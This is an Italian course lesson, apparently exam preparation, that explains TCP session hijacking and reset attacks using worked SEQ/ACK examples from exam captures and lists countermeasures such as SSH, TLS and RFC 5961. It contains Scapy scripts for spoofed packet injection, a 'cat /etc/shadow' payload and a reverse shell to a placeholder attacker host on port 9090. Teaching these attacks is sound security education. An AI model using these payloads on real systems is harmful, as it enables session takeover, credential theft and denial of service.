# **UD5 – Approfondimenti d'esame (attacchi TCP a livello di pacchetto)**

Questa unità integrativa risponde a una richiesta ricorrente e molto tecnica degli appelli: **costruire concretamente il pacchetto TCP** con cui portare a termine un attacco, dati i numeri di sequenza e di acknowledgment osservati in una cattura. Le lezioni esistenti spiegano perché TCP è vulnerabile — assenza di autenticazione, predizione dei numeri di sequenza ([M4/UD2/L3 – IP Spoofing](../UD2/L3%20-%20IP%20Spoofing.md)), effetto degli ACK fuori sequenza ([M4/UD2/L4 – Attacchi TCP – ACK Storm](../UD2/L4%20-%20Attacchi%20TCP%20%E2%80%93%20ACK%20Storm.md)) — ma non mostrano il passaggio operativo del *packet crafting*. Questa lezione lo colma per i due attacchi che gli scritti chiedono: **session hijacking** (dirottamento di una sessione) e **reset attack** (chiusura forzata via RST).

---

## **Lezione 1: TCP Session Hijacking e Reset Attack**

### **1. Il principio: TCP si fida della quaterna e dei numeri di sequenza**

Una connessione TCP è identificata univocamente dalla **quaterna** `(IP sorgente, porta sorgente, IP destinazione, porta destinazione)`. Un segmento in arrivo viene accettato e consegnato all'applicazione se e solo se:

1. la sua quaterna corrisponde a una connessione **stabilita** (`ESTABLISHED`);
2. il suo **numero di sequenza** cade nella **finestra di ricezione** del destinatario (idealmente coincide con il prossimo byte atteso, `rcv_nxt`);
3. il suo **numero di acknowledgment** è coerente con i dati già inviati.

Non esiste **alcuna autenticazione** del mittente: il campo IP sorgente è falsificabile, e nessun segreto condiviso protegge i segmenti. Ne segue che **un attaccante capace di conoscere la quaterna e i numeri di sequenza correnti può fabbricare segmenti che i due estremi accetteranno come legittimi.**

Il modo in cui l'attaccante ottiene quei numeri distingue due scenari (cfr. [M4/UD2/L3 – IP Spoofing](../UD2/L3%20-%20IP%20Spoofing.md), §2):

- **Attacco non-blind (su stessa LAN / MITM):** l'attaccante **sniffa** il traffico — tipicamente dopo un ARP poisoning (cfr. [M4/UD2/L2 – MAC Flooding e ARP Spoofing](../UD2/L2%20-%20MAC%20Flooding%20e%20ARP%20Spoofing.md)) — e **legge direttamente** SEQ e ACK dai pacchetti in transito. È lo scenario degli appelli, in cui la cattura è fornita.
- **Attacco blind (da remoto):** l'attaccante non vede il traffico e deve **predire l'ISN** e i numeri di sequenza, operazione resa difficile dagli ISN randomizzati (RFC 6528).

> 📌 In un attacco non-blind i numeri necessari **non vanno indovinati: si leggono nella cattura**. Tutta la difficoltà si riduce a capire *quale* valore mettere in *quale* campo. È esattamente ciò che gli scritti verificano.

---

### **2. TCP Session Hijacking**

#### **2.1. Obiettivo**

Nel *session hijacking* l'attaccante **si inserisce in una sessione TCP già autenticata** iniettando un segmento dati che impersona uno dei due estremi. Se la sessione è, ad esempio, un login Telnet o rlogin già effettuato, l'attaccante non deve conoscere alcuna password: **sfrutta l'autenticazione già avvenuta** e inietta i propri comandi come se li avesse digitati l'utente legittimo.

#### **2.2. Il pacchetto da spedire**

Per dirottare la sessione **verso il server** (cioè per far arrivare dati al server come se venissero dal client), l'attaccante fabbrica un segmento con:

- **IP sorgente** = IP del client (spoofato), **IP destinazione** = IP del server;
- **porta sorgente / destinazione** = le stesse della sessione dirottata;
- **SEQ** = il numero di sequenza che il server **si aspetta** dal client, cioè il `rcv_nxt` del server. Questo valore è pari all'**ACK che il server ha inviato per ultimo** (il server, ackando fino a *N*, dichiara di attendere il byte *N*);
- **ACK** = il prossimo byte che il client si aspetta dal server, cioè `SEQ_server + lunghezza_dati_server`;
- **flag** `PSH, ACK` (dati da consegnare subito all'applicazione);
- **payload** = i dati/comandi che si vogliono iniettare.

> ⚠️ L'errore tipico è confondere SEQ e ACK del pacchetto da iniettare. La regola sicura: **il SEQ del mio segmento spoofato deve valere quanto il destinatario si aspetta di ricevere** (il suo `rcv_nxt`), che coincide con l'ACK che il destinatario ha appena mandato all'altro estremo.

#### **2.3. Far eseguire un comando al server**

Se il server ospita una sessione interattiva (Telnet, rlogin, una shell remota), i byte iniettati vengono **passati alla shell del server come se fossero stati digitati dall'utente**. Basta quindi che il payload contenga il comando seguito da un **ritorno a capo** (`\r` o `\n`) perché la shell lo esegua. Ad esempio un payload come:

```
\r cat /etc/shadow \r
```

fa eseguire al server `cat /etc/shadow` con i privilegi della sessione dirottata.

C'è però un effetto collaterale importante: dopo l'iniezione, i numeri di sequenza del **client legittimo** e del **server** non combaciano più (il server ha "consumato" byte che il client non ha mai inviato). La connessione si **desincronizza** e degenera in un **ACK storm** (cfr. [M4/UD2/L4 – Attacchi TCP – ACK Storm](../UD2/L4%20-%20Attacchi%20TCP%20%E2%80%93%20ACK%20Storm.md), §2). Per questo l'attaccante, invece di un singolo comando, inietta tipicamente un comando che **gli restituisce il controllo in modo persistente**, cioè una **reverse shell**:

```
\n /bin/bash -i > /dev/tcp/ATTACCANTE/9090 0<&1 2>&1 \n
```

dopo aver messo in ascolto sulla propria macchina `nc -lvp 9090`. Così, anche quando la sessione originale collassa, l'attaccante conserva una shell interattiva sul server.

#### **2.4. Esempio numerico (traccia 13/06/2025)**

La cattura mostra la conversazione tra client A `192.168.0.100` e server B `192.168.0.200`:

- **A → B**: `SEQ = 1429775000`, `ACK = 1250510000`, `len = 24`
- **B → A**: `SEQ = 1250510000`, `ACK = 1429775024`, `len = 167`

Si vuole iniettare un comando **al server B**. Ricaviamo i campi:

- il server B ha ackato `1429775024`, dunque **attende** dal client il byte `1429775024`: questo è il **SEQ** del nostro segmento spoofato (coerente anche con: A ha inviato 24 byte a partire da `1429775000`, quindi il prossimo è `1429775000 + 24 = 1429775024`);
- il client A attende da B il byte `1250510000 + 167 = 1250510167`: questo è l'**ACK** del nostro segmento;
- quaterna e porte come nella sessione, IP sorgente spoofato a `192.168.0.100`.

Il pacchetto da spedire è quindi:

```
IP:  src = 192.168.0.100 (spoofed)   dst = 192.168.0.200
TCP: src port = <porta di A>          dst port = <porta di B>
     SEQ = 1429775024
     ACK = 1250510167
     Flags = PSH, ACK
     Payload = "\n <comando o reverse shell> \n"
```

> 💡 Verifica di coerenza: `SEQ_iniettato (1429775024) == ACK_ultimo_di_B (1429775024)` ✓ e `ACK_iniettato (1250510167) == SEQ_di_B + len_B (1250510000+167)` ✓. Quando i due controlli tornano, il segmento è nella finestra e verrà accettato.

Strumenti pratici: **Scapy** (Python) o la suite **netwox/netwag** per fabbricare il segmento; **Wireshark**/`tcpdump` per leggere i numeri; **arpspoof/ettercap** per il posizionamento MITM. Esempio Scapy:

```python
from scapy.all import IP, TCP, send
pkt = IP(src="192.168.0.100", dst="192.168.0.200") / \
      TCP(sport=SPORT, dport=DPORT, flags="PA",
          seq=1429775024, ack=1250510167) / \
      "\n/bin/bash -i > /dev/tcp/ATTACCANTE/9090 0<&1 2>&1\n"
send(pkt)
```

---

### **3. TCP Reset Attack**

#### **3.1. Obiettivo e meccanismo**

Nel *reset attack* l'obiettivo è **abbattere** una connessione esistente, non dirottarla: una forma di Denial of Service mirato. Si sfrutta il flag **RST**, che TCP usa per segnalare la chiusura brusca di una connessione. Se un estremo riceve un segmento con RST attivo e numero di sequenza **entro la propria finestra**, considera la connessione terminata e libera lo stato.

Per resettare un dato estremo, l'attaccante fabbrica un segmento che:

- **impersona il peer** (IP e porta sorgente dell'altro estremo);
- ha come **SEQ** il valore che il bersaglio **si aspetta di ricevere** (`rcv_nxt` del bersaglio);
- ha il flag **RST** attivo.

> ⚠️ Precisione richiesta dalle implementazioni moderne: la RFC 5961 impone che il RST venga accettato **solo se il SEQ coincide esattamente** con `rcv_nxt` (altrimenti il ricevente risponde con un *challenge ACK*). Gli stack più vecchi accettavano qualunque SEQ *dentro la finestra*. Negli esami si fornisce il valore esatto, quindi si punta al `rcv_nxt` preciso.

#### **3.2. Esempio numerico (traccia 21/02/2025)**

La cattura mostra un segmento **dal server al client** in una sessione Telnet:

- **IP**: src `10.0.2.69` (server), dst `10.0.2.68` (client)
- **TCP**: src port `23`, dst port `45634`
- `SEQ = 2737422009`, `Next SEQ = 2737422033` (quindi `len = 24`), `ACK = 718532383`, flag `PSH, ACK`

Da questi dati ricaviamo i due `rcv_nxt`:

- il **client** ha ricevuto (o sta ricevendo) i 24 byte del server, quindi attende dal server il byte **`2737422033`** (= `Next SEQ`);
- il **server** ha ackato `718532383`, quindi attende dal client il byte **`718532383`**.

**Per resettare il server** `10.0.2.69` (spesso l'obiettivo, così da chiudere il servizio) si spoofa un segmento *dal client*:

```
IP:  src = 10.0.2.68 (spoofed)   dst = 10.0.2.69
TCP: src port = 45634             dst port = 23
     SEQ = 718532383      ← rcv_nxt del server (= ACK che il server aveva inviato)
     Flags = RST
```

**Per resettare il client** `10.0.2.68` si spoofa invece un segmento *dal server*:

```
IP:  src = 10.0.2.69 (spoofed)   dst = 10.0.2.68
TCP: src port = 23                dst port = 45634
     SEQ = 2737422033     ← rcv_nxt del client (= Next SEQ del server)
     Flags = RST
```

In entrambi i casi l'estremo colpito vede un RST perfettamente in sequenza, proveniente (apparentemente) dal proprio interlocutore, e chiude la connessione. Esempio Scapy per resettare il server:

```python
from scapy.all import IP, TCP, send
send(IP(src="10.0.2.68", dst="10.0.2.69") /
     TCP(sport=45634, dport=23, flags="R", seq=718532383))
```

> 💡 Regola unica per hijacking e reset: **il SEQ del pacchetto spoofato è sempre il `rcv_nxt` del destinatario**, cioè "il byte che il bersaglio sta aspettando". Cambia solo cosa ci si mette dentro: dati + `PSH/ACK` per dirottare, nessun dato + `RST` per abbattere.

---

### **4. Contromisure**

Gli attacchi di reset e hijacking sfruttano la mancanza di autenticazione di TCP; le difese agiscono su piani diversi:

- **Cifratura e autenticazione end-to-end**: sostituire Telnet/rlogin (in chiaro, banalmente dirottabili) con **SSH**, e usare **TLS/IPsec**. Anche potendo iniettare byte, l'attaccante non conosce le chiavi: i segmenti falsi vengono scartati come non autenticati e non può leggere SEQ/ACK utili.
- **ISN imprevedibili** (RFC 6528): rendono impraticabile lo scenario *blind*.
- **Validazione rigorosa del RST** (RFC 5961, *challenge ACK*): impedisce i reset con SEQ solo approssimato.
- **Prevenire lo sniffing sulla LAN**: DHCP snooping, Dynamic ARP Inspection, port security (cfr. [M4/UD2/L2 – MAC Flooding e ARP Spoofing](../UD2/L2%20-%20MAC%20Flooding%20e%20ARP%20Spoofing.md)) tolgono all'attaccante la posizione MITM da cui legge i numeri di sequenza.
- **Firewall stateful e IDS/IPS**: possono rilevare la desincronizzazione e l'ACK storm conseguenti a un hijack.

> ✅ **Ricapitolando** — TCP accetta un segmento se combaciano quaterna e numeri di sequenza, senza autenticare il mittente. In un attacco non-blind i numeri si leggono direttamente dalla cattura: per **dirottare** una sessione si inietta un segmento `PSH/ACK` con `SEQ = rcv_nxt del server`, `ACK = SEQ_server + len_server` e come payload il comando (idealmente una reverse shell, perché l'iniezione desincronizza la sessione in ACK storm); per **resettare** si invia un segmento `RST` con `SEQ` pari al `rcv_nxt` dell'estremo da abbattere. La contromisura decisiva è la cifratura autenticata end-to-end (SSH/TLS/IPsec), affiancata da ISN casuali, validazione del RST e difese anti-sniffing sulla LAN.

Collegamenti: [M4/UD2/L3 – IP Spoofing](../UD2/L3%20-%20IP%20Spoofing.md), [M4/UD2/L4 – Attacchi TCP – ACK Storm](../UD2/L4%20-%20Attacchi%20TCP%20%E2%80%93%20ACK%20Storm.md), [M4/UD2/L2 – MAC Flooding e ARP Spoofing](../UD2/L2%20-%20MAC%20Flooding%20e%20ARP%20Spoofing.md).
